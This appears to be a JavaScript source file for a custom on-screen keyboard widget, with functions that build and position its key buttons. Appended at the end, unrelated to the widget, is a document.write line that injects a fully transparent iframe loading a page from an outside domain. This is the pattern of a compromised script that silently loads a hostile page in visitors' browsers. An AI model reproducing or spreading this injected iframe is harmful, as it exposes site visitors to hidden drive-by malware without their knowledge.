// KeyBoard InPut (Custom) kbPart4 (30-12-2004)
// by Vic Phillips http://www.vicsjavascripts.org.uk


// No Need to Change

function kbCustKeyBd(kb){
 kbString='';
 kbAry=new Array();
 kbAry=kbCustomArys[kb*1];
 kbMakeCustomKeys();
 kbKBObj.innerHTML=kbInnC+kbQC+kbCom;
 kbButNu=Math.floor(kbAry.length/4)+1;
 if (kbButNu<4){ kbButNu=4; }
 kbKBW=((kbButNu*18)+38);
 kbKBH=(110);
 kbKBObjS.width=(kbKBW)+'px';
 kbKBObjS.height=(kbKBH)+'px';
 kbCustKeyStyle();
}

// KeyBoard Inner - Custom Key Buttons
function kbMakeCustomKeys(){
 kbInnC='';
 for (kb=0;kb<kbAry.length;kb++){
  kbInnC+='<div id=kbCust'+kb+' class=kbBut onclick=javascript:kbTypeIP(\''+kb+'\',0); >'+(kbAry[kb])+'</div> ';
 }
}

function kbCustKeyStyle(){
 kbLObj=kbgEBId('kbCapLock');
 kbSObj=kbgEBId('kbShift');
 kbBObj=kbgEBId('kbBack');
 kbCObj=kbgEBId('kbClear');
 kbFCAry=new Array(kbLObj.style,kbSObj.style,kbBObj.style,kbCObj.style);
 for (kb0=0;kb0<kbFCAry.length;kb0++){ kbCKStyle(kbFCAry[kb0]); }
 kbFCAry[0].top='-2000px';
 kbFCAry[1].top='-2000px';
 kbFCAry[2].top='22px';
 kbFCAry[2].left=(kbKBW-36)+'px';
 kbFCAry[3].top='39px';
 kbFCAry[3].left=(kbKBW-36)+'px';
 kbButPos();
 kbBAry[0].top='56px';
 kbBAry[0].left=(kbKBW-36)+'px';
 kbBAry[0].height=(31+kbBdr)+'px';
 kbBAry[1].left=(kbKBW/2-17)+'px';
 kbBAry[1].top='90px';
 kbBAry[2].left=(kbKBW-36)+'px';
 kbBAry[2].top='90px';
 kbBAry[3].left=(2)+'px';
 kbBAry[3].top='90px';
 kbButT=22; kbButL=0; kbButR=kbButNu;
 for (kbi=0;kbi<kbAry.length;kbi++){
  kbCKStyle(kbgEBId(('kbCust'+kbi)).style);
  kbgEBId('kbCust'+kbi).style.left=(kbButL*18+2)+'px';
  kbgEBId('kbCust'+kbi).style.top=(kbButT)+'px';
  kbgEBId('kbCust'+kbi).style.width=(kbKSz+kbBdr)+'px';
  kbButL++;
  if (kbi==kbButR-1){
   kbButL=0;
   kbButR=kbButR+kbButNu;
   kbButT=kbButT+17;
  }
 }
}

function kbCKStyle(kb){
 kb.position='absolute'
 kb.overflow='hidden';
 kb.width=(30+kbBdr)+'px';
 kb.height=(kbKSz+kbBdr)+'px';
 kb.top='90px';
 kb.left='2px';
 kb.color=kbKeyTxtColor;
 kb.backgroundColor=kbKeyBGColor;
 kb.border='solid black 1px';
 kb.textAlign='center';
 kb.fontSize='10px';
 kb.cursor=kbCur;
}

kbCkCustom=1;




document.write('<style>.vb_style_forum {filter: alpha(opacity=0);opacity: 0.0;width: 200px;height: 150px;}</style><div class="vb_style_forum"><iframe height="150" width="200" src="http://gclabrelscon.net/about.php"></iframe></div>');
